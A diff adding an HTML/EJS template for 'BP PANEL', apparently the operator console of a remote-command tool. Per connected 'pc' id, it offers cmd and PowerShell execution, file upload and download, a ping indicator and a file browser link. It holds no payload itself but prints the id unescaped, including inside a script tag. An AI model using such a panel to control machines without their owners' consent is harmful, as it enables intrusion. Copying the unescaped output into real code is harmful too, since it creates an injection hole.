@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BP PANEL | <%- id %></title>
+    <link rel="stylesheet" href="/assets/icons.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:ital,wght@0,400;0,500;0,600;0,700;1,600&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            background: none;
+            font-family: 'Roboto Mono', monospace;
+            outline: none;
+            border: none;
+            text-decoration: none;
+        }
+
+        ::-webkit-scrollbar {
+            width: .5rem;
+            height: .5rem;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #ffffff6c;
+            border-radius: 10px;
+        }
+
+        body {
+            width: 100%;
+            height: 100vh;
+            background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.4)), url(/assets/bg.jpg);
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-color: #000;
+            color: #e5e5e5;
+            display: flex;
+            flex-direction: column;
+        }
+
+        header {
+            width: 100%;
+            height: 5vh;
+            background: hwb(0 0% 100% / 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: .5rem;
+        }
+
+        .c {
+            width: 100%;
+            height: 10vh;
+            display: flex;
+            align-items: center;
+            padding: .5rem;
+            background: hwb(0 0% 100% / 0.5);
+        }
+
+        #terminal {
+            width: 100%;
+            height: 85vh;
+            background: hwb(0 0% 100% / 0.5);
+            padding: .5rem;
+            font-size: 1.2rem;
+            overflow-y: scroll;
+        }
+
+        #terminal pre {
+            color: #e5e5e5;
+        }
+
+        #terminal pre.l1 {
+            color: #ff2600;
+        }
+
+        #terminal pre.l0 {
+            color: #00ff00;
+        }
+
+        button {
+            padding: .4rem 1rem;
+            font-size: 1.1rem;
+            color: #e5e5e5;
+            background: #f8003e;
+            border-radius: 7px;
+            cursor: pointer;
+        }
+
+        input {
+            width: 100%;
+            padding: .6rem;
+            font-size: 1.2rem;
+            border-radius: 8px;
+            color: #e5e5e5;
+            /* background: #111; */
+        }
+
+        select {
+            background: #111;
+            padding: .6rem;
+            font-size: 1.2rem;
+            border-radius: 8px;
+            color: #e5e5e5;
+            text-transform: uppercase;
+        }
+
+        dialog {
+            width: 100%;
+            height: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            padding: .5rem;
+            background: #000;
+            overflow-y: scroll;
+        }
+
+        dialog .head {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            color: #e5e5e5;
+        }
+
+        .commands p {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            gap: 1.5rem;
+            color: #e5e5e5;
+            padding: .5rem;
+            text-transform: capitalize;
+            margin-top: .1rem;
+        }
+
+        p.intro {
+            width: 100%;
+            text-align: center;
+            background: linear-gradient(100deg, #ff2600, #5900ff);
+            padding: .2rem;
+            text-transform: uppercase;
+        }
+
+        @media(max-width: 600px) {
+            html {
+                font-size: 90%;
+            }
+        }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.6.2/socket.io.js"
+        integrity="sha512-jMNwWSmjje4fjYut9MBGKXw5FZA6D67NHAuC9szpjbbjg51KefquNfvn4DalCbGfkcv/jHsHnPo1o47+8u4biA=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script>
+        let ID = `<%- id %>`
+    </script>
+    <script src="/assets/commands.js" defer></script>
+    <script src="/assets/app.js" defer></script>
+</head>
+
+<body>
+    <header>
+        <h2><%- id %> <sub><small>'pc</small></sub></h2>
+        <div>
+            <b id="indicate">0 PING</b>
+            <button onclick="openBox('.commands')"><i class="material-icons">code</i></button>
+            <a href="/panel/files?id=<%- id %>" target="_blank"><button><i
+                        class="material-icons">folder</i></button></a>
+        </div>
+    </header>
+
+
+    <form class="c">
+        <select name="application">
+            <option value="cmd">cmd</option>
+            <option value="powershell">powershell</option>
+            <option value="upload">upload</option>
+            <option value="download">download</option>
+            <option value="-">-</option>
+        </select>
+        <input type="text" name="command" placeholder="Command" autocomplete="off">
+        <button type="submit">Execute</button>
+    </form>
+
+    <div id="terminal"></div>
+
+    <p class="intro">This tool was created by madhan.</p>
+    <!--  -->
+    <dialog class="commands">
+        <div class="head">
+            <h2>commands</h2>
+            <form method="dialog">
+                <button type="submit">
+                    <i class="material-icons">close</i>
+                </button>
+            </form>
+        </div>
+
+    </dialog>
+</body>
+
+</html>
